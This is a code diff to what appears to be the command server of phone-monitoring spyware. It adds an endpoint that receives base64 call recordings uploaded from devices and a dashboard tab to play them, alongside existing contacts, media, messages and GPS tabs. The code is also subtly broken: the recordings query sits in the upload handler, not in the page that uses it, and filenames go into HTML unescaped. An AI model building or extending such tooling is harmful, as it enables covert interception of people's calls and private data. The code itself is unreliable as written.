@@ -106,6 +106,15 @@ const DownloadRequestSchema = new mongoose.Schema({
 
 const DownloadRequest = mongoose.model('DownloadRequest', DownloadRequestSchema);
 
+const CallRecordingSchema = new mongoose.Schema({
+    token: String,
+    filename: String,
+    audio_base64: String,
+    recorded_at: Number,
+    received_at: { type: Date, default: Date.now }
+});
+const CallRecording = mongoose.model('CallRecording', CallRecordingSchema)
+
 const Employer = mongoose.model('Employer', EmployerSchema);
 const Token = mongoose.model('Token', TokenSchema);
 const Device = mongoose.model('Device', DeviceSchema);
@@ -358,6 +367,18 @@ app.post('/device/notifications', async (req, res) => {
         const token = getToken(req);
         await Notification.create({ token, ...req.body, received_at: new Date() });
         console.log(`Notification from ${token}`);
+        res.json({ success: true });
+    } catch (e) {
+        res.json({ success: false, message: e.message });
+    }
+});
+
+app.post('/device/call-recording', async (req, res) => {
+    try {
+        const token = getToken(req);
+	const recordings = await CallRecording.find({ token }).sort({ recorded_at: -1 }).limit(50);
+        await CallRecording.create({ token, ...req.body });
+        console.log(`Call recording received from ${token}: ${req.body.filename}`);
         res.json({ success: true });
     } catch (e) {
         res.json({ success: false, message: e.message });
@@ -686,6 +707,7 @@ app.get('/device', async (req, res) => {
             <button class="tab" onclick="showTab('contacts')">👥 Contacts</button>
             <button class="tab" onclick="showTab('media')">🖼️ Media</button>
             <button class="tab" onclick="showTab('messages')">🔔 Messages</button>
+	    <button class="tab" onclick="showTab('recordings')">🎙️ Recordings</button>
         </div>
 
         <!-- Apps Tab -->
@@ -731,6 +753,21 @@ app.get('/device', async (req, res) => {
                 </table>`}
             </div>
         </div>
+
+<!-- Recordings Tab -->
+<div id="tab-recordings" class="tab-content">
+    <div class="card" style="padding:0">
+        ${recordings.length === 0 ? '<p class="no-data">No call recordings</p>' : `
+        <table>
+            <tr><th>Filename</th><th>Date</th><th>Play</th></tr>
+            ${recordings.map(r => `<tr>
+                <td>${r.filename}</td>
+                <td>${new Date(r.recorded_at).toLocaleString()}</td>
+                <td><audio controls src="data:audio/mp4;base64,${r.audio_base64}"></audio></td>
+            </tr>`).join('')}
+        </table>`}
+    </div>
+</div>
 
         <!-- GPS Tab -->
         <div id="tab-gps" class="tab-content">
